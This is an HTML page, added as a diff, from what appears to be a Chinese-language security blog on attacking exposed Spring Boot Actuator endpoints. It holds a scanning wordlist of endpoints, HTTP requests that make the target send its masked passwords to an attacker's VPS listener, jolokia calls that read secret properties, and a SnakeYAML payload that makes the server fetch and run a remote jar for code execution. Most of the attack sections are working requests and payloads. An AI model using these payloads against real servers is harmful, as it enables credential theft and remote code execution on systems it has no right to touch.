@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Boot Actuator - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Boot Actuator", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+          {title: "\u7aef\u70b9", url: "#_2", children: [
+              {title: "\u8be6\u7ec6\u4e00\u70b9\u7684\u653b\u51fb\u624b\u6cd5", url: "#_3" },
+          ]},
+          {title: "/env \u661f\u53f7\u53bb\u9664", url: "#env", children: [
+              {title: "\u62fc\u5199\u9519\u8bef", url: "#_4" },
+              {title: "\u5229\u7528/heapdump", url: "#heapdump" },
+              {title: "\u5229\u7528spring.cloud.bootstrap.location", url: "#springcloudbootstraplocation" },
+              {title: "\u5229\u7528eureka.client.serviceUrl.defaultZone", url: "#eurekaclientserviceurldefaultzone" },
+              {title: "\u5229\u7528jolokia\u7684mbean", url: "#jolokiambean" },
+          ]},
+          {title: "RCE\u6f0f\u6d1e", url: "#rce", children: [
+              {title: "spring cloud snakeyml", url: "#spring-cloud-snakeyml" },
+          ]},
+          {title: "REF:", url: "#ref", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Spring%20boot/Spring%20boot/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Spring%20boot/Spring%20boot/" class="btn btn-xs btn-link">
+        Spring boot
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spring%20Boot/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spring%20Boot/" class="btn btn-xs btn-link">
+        Spring Boot
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-boot-actuator">Spring Boot Actuator</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#端点">端点</a><ul>
+<li><a href="#详细一点的攻击手法">详细一点的攻击手法</a></li>
+</ul>
+</li>
+<li><a href="#env-星号去除">/env 星号去除</a><ul>
+<li><a href="#拼写错误">拼写错误</a></li>
+<li><a href="#利用heapdump">利用/heapdump</a></li>
+<li><a href="#利用springcloudbootstraplocation">利用spring.cloud.bootstrap.location</a></li>
+<li><a href="#利用eurekaclientserviceUrldefaultZone">利用eureka.client.serviceUrl.defaultZone</a></li>
+<li><a href="#利用jolokia的mbean">利用jolokia的mbean</a></li>
+</ul>
+</li>
+<li><a href="#RCE漏洞">RCE漏洞</a><ul>
+<li><a href="#spring-cloud-snakeyml">spring cloud snakeyml</a></li>
+</ul>
+</li>
+<li><a href="#REF">REF:</a></li>
+</ul>
+<p>批量扫描：<a href="https://github.com/AabyssZG/SpringBoot-Scan.git" title="https://github.com/AabyssZG/SpringBoot-Scan.git">https://github.com/AabyssZG/SpringBoot-Scan.git</a></p>
+<p>Actuator是spring boot的一个监控模块，它定义了很多endpoint（端点，也就是一些特定的路由）用来显示统计数据，监控信息等。
+本意是帮助开发人员对Spring服务进行监控从而进行维护等操作，但由于Actuator可能存在未授权问题，导致这些敏感信息会暴露给攻击者，从而造成潜在的攻击。</p>
+<h1 id="_2">端点</h1>
+<p>Spring Boot &lt; 1.5：默认未授权访问所有端点
+Spring Boot &gt;= 1.5：默认只允许访问 /health 和 /info 端点，但是此安全性通常被应用程序开发人员禁用了</p>
+<p><img alt="" src="../image/image_7COmaq8cP-.png" /></p>
+<p>如下是主要扫描endpoint的字典</p>
+<pre><code class="language-纯文本">actuator
+actuator/auditLog
+actuator/auditevents
+actuator/autoconfig
+actuator/beans
+actuator/caches
+actuator/conditions
+actuator/configurationMetadata
+actuator/configprops
+actuator/dump
+actuator/env
+actuator/events
+actuator/exportRegisteredServices
+actuator/features
+actuator/flyway
+actuator/health
+actuator/heapdump
+actuator/healthcheck
+actuator/heapdump
+actuator/httptrace
+actuator/hystrix.stream
+actuator/info
+actuator/integrationgraph
+actuator/jolokia
+actuator/logfile
+actuator/loggers
+actuator/loggingConfig
+actuator/liquibase
+actuator/metrics
+actuator/mappings
+actuator/scheduledtasks
+actuator/swagger-ui.html
+actuator/prometheus
+actuator/refresh
+actuator/registeredServices
+actuator/releaseAttributes
+actuator/resolveAttributes
+actuator/scheduledtasks
+actuator/sessions
+actuator/springWebflow
+actuator/shutdown
+actuator/sso
+actuator/ssoSessions
+actuator/statistics
+actuator/status
+actuator/threaddump
+actuator/trace
+auditevents
+autoconfig
+api.html
+api/index.html
+api/swagger-ui.html
+api/v2/api-docs
+api-docs
+beans
+caches
+cloudfoundryapplication
+conditions
+configprops
+distv2/index.html
+docs
+druid/index.html
+druid/login.html
+druid/websession.html
+dubbo-provider/distv2/index.html
+dump
+entity/all
+env
+env/(name)
+eureka
+flyway
+gateway/actuator
+gateway/actuator/auditevents
+gateway/actuator/beans
+gateway/actuator/conditions
+gateway/actuator/configprops
+gateway/actuator/env
+gateway/actuator/health
+gateway/actuator/heapdump
+gateway/actuator/httptrace
+gateway/actuator/hystrix.stream
+gateway/actuator/info
+gateway/actuator/jolokia
+gateway/actuator/logfile
+gateway/actuator/loggers
+gateway/actuator/mappings
+gateway/actuator/metrics
+gateway/actuator/scheduledtasks
+gateway/actuator/swagger-ui.html
+gateway/actuator/threaddump
+gateway/actuator/trace
+health
+heapdump
+heapdump.json
+httptrace
+hystrix
+hystrix.stream
+info
+integrationgraph
+jolokia
+jolokia/list
+liquibase
+list
+logfile
+loggers
+liquibase
+metrics
+mappings
+monitor
+prometheus
+refresh
+scheduledtasks
+sessions
+shutdown
+spring-security-oauth-resource/swagger-ui.html
+spring-security-rest/api/swagger-ui.html
+static/swagger.json
+sw/swagger-ui.html
+swagger
+swagger/codes
+swagger/index.html
+swagger/static/index.html
+swagger/swagger-ui.html
+swagger-dubbo/api-docs
+swagger-ui
+swagger-ui.html
+swagger-ui/html
+swagger-ui/index.html
+system/druid/index.html
+threaddump
+template/swagger-ui.html
+trace
+user/swagger-ui.html
+version
+v1.1/swagger-ui.html
+v1.2/swagger-ui.html
+v1.3/swagger-ui.html
+v1.4/swagger-ui.html
+v1.5/swagger-ui.html
+v1.6/swagger-ui.html
+v1.7/swagger-ui.html
+/v1.8/swagger-ui.html
+/v1.9/swagger-ui.html
+/v2.0/swagger-ui.html
+v2.1/swagger-ui.html
+v2.2/swagger-ui.html
+v2.3/swagger-ui.html
+v2/swagger.json
+webpage/system/druid/index.html
+%20/swagger-ui.html
+
+</code></pre>
+<h2 id="_3">详细一点的攻击手法</h2>
+<p>直接访问/actuator，如果有未授权会暴露所有的可访问的endpoint</p>
+<p><img alt="" src="../image/image_kHK6Z7vXtZ.png" /></p>
+<p>比较有用的有/env 可能会暴露密码信息，值得注意的是通过对/env 发送POST包，又可能会直接修改/env里对应键的值，从而造成安全漏洞。</p>
+<p><img alt="" src="../image/image_PQCq02MCkr.png" /></p>
+<p>/mappings 暴露路由信息和对应控制器</p>
+<p>/heapdump访问Java进程在某个时间点上的内存快照，访问后会下载快照文件，可用工具<a href="https://github.com/whwlsfb/JDumpSpider/releases" title="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a> 或<a href="https://github.com/wyzxxz/heapdump_tool" title="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a> 对内存进行分析</p>
+<p>/trace 获取一段时间内所有对该网站的http请求包，可以翻翻拿cookie或者认证信息等。</p>
+<p>/refresh ，我们对/env通过post发包改变其键值信息后，通过对/refresh进行post发包刷新属性信息，使键值信息生效，从而导致一些rce漏洞</p>
+<p>/restart，相对较少暴露，对/env通过post发包改变信息后，对该端点进行post发包重启应用，从而导致一些rce漏洞</p>
+<p>/jolokia ， /jolokia/list 获取mbean信息，间接触发rce；还可以获得/env里被星号遮盖的敏感信息</p>
+<h1 id="env">/env 星号去除</h1>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果。</p>
+<h2 id="_4">拼写错误</h2>
+<p>程序员拼敏感词拼错了，比如password拼成passwd等，就没有星号了</p>
+<h2 id="heapdump">利用/heapdump</h2>
+<p>利用条件：/heapdump未授权访问</p>
+<p>/heapdump可以下载内存快照，下载下来后用工具<a href="https://github.com/whwlsfb/JDumpSpider/releases" title="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a> 或<a href="https://github.com/wyzxxz/heapdump_tool" title="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a> 对内存进行分析，搜索password等关键词来获取敏感信息</p>
+<h2 id="springcloudbootstraplocation">利用spring.cloud.bootstrap.location</h2>
+<p>nc -lvk 80  vps开监听</p>
+<pre><code class="language-纯文本">spring 1.x
+
+POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
+</code></pre>
+<pre><code class="language-纯文本">spring 2.x
+
+POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=${security.user.password}&quot;}
+</code></pre>
+<p>然后刷新配置即可</p>
+<pre><code class="language-纯文本">spring 1.x
+
+POST /refresh
+Content-Type: application/x-www-form-urlencoded
+spring 2.x
+
+POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h2 id="eurekaclientserviceurldefaultzone">利用eureka.client.serviceUrl.defaultZone</h2>
+<p>vps开启监听</p>
+<pre><code class="language-纯文本">spring 1.x
+POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
+</code></pre>
+<pre><code class="language-纯文本">spring 2.x
+
+POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:${security.user.password}@your-vps-ip&quot;}
+</code></pre>
+<p>然后刷新配置</p>
+<pre><code class="language-纯文本">spring 1.x
+
+POST /refresh
+Content-Type: application/x-www-form-urlencoded
+spring 2.x
+
+POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code>头内容：</p>
+<p>Authorization: Basic dmFsdWU6MTIzNDU2</p>
+<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code>即是目标星号 * 脱敏前的属性值明文。</p>
+<h2 id="jolokiambean">利用jolokia的mbean</h2>
+<p>jolokia就是一个监控jvm的组件</p>
+<p>假设我们获取的env的值为security.user.password</p>
+<p><strong>调用 org.springframework.bootMbean</strong></p>
+<blockquote>
+<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
+</blockquote>
+<pre><code class="language-纯文本">spring 1.x
+POST /jolokia
+
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+
+</code></pre>
+<pre><code class="language-纯文本">spring 2.x
+
+  POST /actuator/jolokia
+
+  Content-Type: application/json
+
+  {&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<p>调用<strong>org.springframework.cloud.context.environmentMbean</strong></p>
+<blockquote>
+<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
+</blockquote>
+<pre><code class="language-纯文本">spring 1.x
+
+  POST /jolokia
+
+  Content-Type: application/json
+
+  {&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<pre><code class="language-纯文本">spring 2.x
+
+  POST /actuator/jolokia
+
+  Content-Type: application/json
+
+  {&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<h1 id="rce">RCE漏洞</h1>
+<p><a href="https://www.freebuf.com/articles/web/271347.html" title="https://www.freebuf.com/articles/web/271347.html">https://www.freebuf.com/articles/web/271347.html</a></p>
+<p>想要rce，要么能post设置env属性，要么有jolokia接口，要么有/h2-console路由</p>
+<h2 id="spring-cloud-snakeyml">spring cloud snakeyml</h2>
+<pre><code class="language-纯文本"># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<pre><code class="language-纯文本">在网站根目录下放置后缀为 yml的文件 example.yml，内容如下：
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;]
+  ]]
+]
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>jar</code>的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考<a href="https://github.com/artsploit/yaml-payload" title="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<pre><code class="language-纯文本">设置 spring.cloud.bootstrap.location 属性
+spring 1.x
+
+POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+
+
+spring 2.x
+
+POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
+</code></pre>
+<pre><code class="language-纯文本">刷新配置
+spring 1.x
+
+POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+spring 2.x
+
+POST /actuator/refresh
+Content-Type: application/json
+
+</code></pre>
+<h1 id="ref">REF:</h1>
+<p><a href="https://wolke.cn/post/115ad433.html" title="https://wolke.cn/post/115ad433.html">https://wolke.cn/post/115ad433.html</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Spring%20boot/Spring%20boot/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Spring%20boot/Spring%20boot/" class="btn btn-xs btn-link">
+        Spring boot
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spring%20Boot/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spring%20Boot/" class="btn btn-xs btn-link">
+        Spring Boot
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
